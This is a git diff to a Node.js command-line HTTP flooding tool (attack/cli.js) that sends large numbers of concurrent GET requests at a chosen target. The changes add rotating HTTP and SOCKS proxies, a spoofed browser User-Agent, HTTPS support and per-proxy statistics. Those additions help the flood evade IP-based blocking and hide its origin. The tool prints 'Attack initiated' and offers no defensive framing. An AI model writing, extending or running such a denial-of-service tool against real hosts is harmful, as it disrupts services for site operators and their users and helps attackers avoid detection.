@@ -1,7 +1,57 @@
 #!/usr/bin/env node
 
 const http = require('http');
+const https = require('https');
 const chalk = require('chalk');
+const fs = require('fs');
+const path = require('path');
+const { HttpsProxyAgent } = require('https-proxy-agent');
+const { SocksProxyAgent } = require('socks-proxy-agent');
+
+// Load proxies
+let proxies = [];
+let proxyEnabled = false;
+let proxyIndex = 0;
+
+try {
+  const proxyConfig = JSON.parse(fs.readFileSync(path.join(__dirname, '../proxies.json'), 'utf8'));
+  proxies = proxyConfig.proxies || [];
+  proxyEnabled = proxyConfig.enabled || false;
+  
+  if (proxyEnabled && proxies.length > 0) {
+    console.log(chalk.green(`\nLoaded ${proxies.length} proxies from proxies.json`));
+  }
+} catch (error) {
+  console.log(chalk.yellow('\nNo proxy configuration found. Running without proxies.'));
+}
+
+function getNextProxy() {
+  if (!proxyEnabled || proxies.length === 0) return null;
+  
+  const proxy = proxies[proxyIndex];
+  proxyIndex = (proxyIndex + 1) % proxies.length;
+  return proxy;
+}
+
+function getRandomProxy() {
+  if (!proxyEnabled || proxies.length === 0) return null;
+  return proxies[Math.floor(Math.random() * proxies.length)];
+}
+
+function createProxyAgent(proxyUrl, targetUrl) {
+  if (!proxyUrl) return undefined;
+  
+  try {
+    if (proxyUrl.startsWith('socks')) {
+      return new SocksProxyAgent(proxyUrl);
+    } else {
+      return new HttpsProxyAgent(proxyUrl);
+    }
+  } catch (error) {
+    console.error(chalk.red(`Proxy error: ${error.message}`));
+    return undefined;
+  }
+}
 
 // Parse command line arguments
 const args = process.argv.slice(2);
@@ -47,6 +97,9 @@ for (let i = 0; i < args.length; i++) {
       console.log('  -d, --duration <sec>     Duration in seconds (default: 60)');
       console.log('  --delay <ms>             Delay between requests in ms (default: 10)');
       console.log('  -h, --help               Show this help message\n');
+      console.log('Proxy Configuration:');
+      console.log('  Edit proxies.json to add proxies');
+      console.log('  Set "enabled": true to use proxies\n');
       console.log('Examples:');
       console.log('  node attack/cli.js --target http://localhost:3000 --workers 50 --duration 30');
       console.log('  node attack/cli.js -t http://example.com -w 200 -d 60\n');
@@ -67,6 +120,7 @@ console.log(chalk.gray('  Target:   ') + chalk.yellow(config.target));
 console.log(chalk.gray('  Workers:  ') + chalk.yellow(config.workers));
 console.log(chalk.gray('  Duration: ') + chalk.yellow(config.duration + 's'));
 console.log(chalk.gray('  Delay:    ') + chalk.yellow(config.delay + 'ms'));
+console.log(chalk.gray('  Proxies:  ') + (proxyEnabled ? chalk.green(`Enabled (${proxies.length})`) : chalk.red('Disabled')));
 console.log(chalk.gray('-'.repeat(60)) + '\n');
 
 console.log(chalk.green.bold('Attack initiated...\n'));
@@ -80,6 +134,7 @@ let stats = {
   successfulRequests: 0,
   failedRequests: 0,
   errors: {},
+  proxyStats: {},
   startTime: Date.now()
 };
 
@@ -89,10 +144,33 @@ function makeRequest(workerId) {
   if (!isRunning) return;
 
   const endpoint = endpoints[Math.floor(Math.random() * endpoints.length)];
+  const proxyUrl = getRandomProxy();
+  const targetURL = new URL(config.target + endpoint);
   
   stats.totalRequests++;
   
-  const req = http.get(`${config.target}${endpoint}`, (res) => {
+  const options = {
+    hostname: targetURL.hostname,
+    port: targetURL.port || (targetURL.protocol === 'https:' ? 443 : 80),
+    path: targetURL.pathname + targetURL.search,
+    method: 'GET',
+    headers: {
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+      'Accept': '*/*',
+      'Connection': 'keep-alive'
+    }
+  };
+
+  if (proxyUrl) {
+    options.agent = createProxyAgent(proxyUrl, config.target);
+    if (!stats.proxyStats[proxyUrl]) {
+      stats.proxyStats[proxyUrl] = { success: 0, failed: 0 };
+    }
+  }
+
+  const protocol = targetURL.protocol === 'https:' ? https : http;
+  
+  const req = protocol.get(options, (res) => {
     let data = '';
     
     res.on('data', (chunk) => {
@@ -102,9 +180,11 @@ function makeRequest(workerId) {
     res.on('end', () => {
       if (res.statusCode >= 200 && res.statusCode < 400) {
         stats.successfulRequests++;
+        if (proxyUrl) stats.proxyStats[proxyUrl].success++;
       } else {
         stats.failedRequests++;
         stats.errors[res.statusCode] = (stats.errors[res.statusCode] || 0) + 1;
+        if (proxyUrl) stats.proxyStats[proxyUrl].failed++;
       }
       
       if (isRunning) {
@@ -117,6 +197,7 @@ function makeRequest(workerId) {
     stats.failedRequests++;
     const errorType = err.code || 'ERROR';
     stats.errors[errorType] = (stats.errors[errorType] || 0) + 1;
+    if (proxyUrl) stats.proxyStats[proxyUrl].failed++;
     
     if (isRunning) {
       setTimeout(() => makeRequest(workerId), config.delay);
@@ -127,6 +208,7 @@ function makeRequest(workerId) {
     req.destroy();
     stats.failedRequests++;
     stats.errors['TIMEOUT'] = (stats.errors['TIMEOUT'] || 0) + 1;
+    if (proxyUrl) stats.proxyStats[proxyUrl].failed++;
     
     if (isRunning) {
       setTimeout(() => makeRequest(workerId), config.delay);
@@ -178,6 +260,19 @@ setTimeout(() => {
     Object.entries(stats.errors)
       .sort((a, b) => b[1] - a[1])
       .forEach(([error, count]) => console.log(chalk.red(`  ${error}: ${count}`)));
+  }
+
+  if (proxyEnabled && Object.keys(stats.proxyStats).length > 0) {
+    console.log(chalk.gray('-'.repeat(60)));
+    console.log(chalk.cyan.bold('Proxy Statistics:'));
+    Object.entries(stats.proxyStats)
+      .sort((a, b) => (b[1].success + b[1].failed) - (a[1].success + a[1].failed))
+      .slice(0, 5)
+      .forEach(([proxy, stat]) => {
+        const total = stat.success + stat.failed;
+        const rate = total > 0 ? ((stat.success / total) * 100).toFixed(1) : '0.0';
+        console.log(chalk.cyan(`  ${proxy.substring(0, 40)}... - Success: ${stat.success} | Failed: ${stat.failed} | Rate: ${rate}%`));
+      });
   }
   
   console.log(chalk.gray('='.repeat(60)) + '\n');
